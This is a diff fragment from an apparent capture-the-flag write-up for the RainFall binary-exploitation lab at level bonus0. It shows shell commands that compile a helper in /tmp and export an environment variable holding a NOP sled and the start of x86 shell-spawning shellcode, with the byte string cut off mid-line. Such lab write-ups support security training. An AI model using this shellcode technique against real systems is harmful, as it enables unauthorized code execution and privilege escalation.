@@ -246,4 +246,4 @@ And create the variable with shellcode:
 	bonus0@RainFall:~$ ls /tmp
 	bonus0@RainFall:~$ vi /tmp/find_env.c
 	bonus0@RainFall:~$ gcc -o /tmp/find_env /tmp/find_env.c
-	bonus0@RainFall:~
+	bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2
